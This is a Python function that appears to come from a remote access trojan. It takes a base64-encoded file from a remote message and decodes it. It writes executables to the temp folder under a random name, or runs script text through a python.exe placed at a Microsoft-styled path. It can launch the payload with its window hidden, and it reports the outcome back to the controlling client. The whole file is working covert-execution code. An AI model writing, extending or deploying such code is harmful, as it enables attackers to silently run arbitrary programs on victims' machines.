import os
import base64
import subprocess
import tempfile
import random
import string

def execute_file(data, client, converter):
    try:
        base64_file = data["execute_file"]
        visibility = data["visibility"]
        file_type = data["file_type"]
        decoded_file = base64.b64decode(base64_file)
        python_library_path = os.path.join(os.environ['ProgramFiles(x86)'], 'Microsoft', 'Python', 'pyportable', 'python.exe')

        temp_dir = tempfile.gettempdir()
        
        if file_type == ".exe":
            random_filename = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".exe"
            full_path = os.path.join(temp_dir, random_filename)
            
            with open(full_path, "wb") as f:
                f.write(decoded_file)

            command = [full_path]
        else:
            script_content = decoded_file.decode("utf-8")
            command = [python_library_path, "-c", script_content]

        if visibility == "Visible":
            process = subprocess.Popen(command, shell=False)
        else:
            process = subprocess.Popen(
                command,
                shell=False,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

        if process.poll() is None:
            client.send_message(converter.encode({"execute_file": "File executed successfully."}))
        else:
            client.send_message(converter.encode({"execute_file_logger": "File failed to start."}))

    except Exception as e:
        client.send_message(converter.encode({"execute_file_logger": str(e)}))

    finally:
        if file_type == ".exe" and os.path.exists(full_path):
            os.remove(full_path)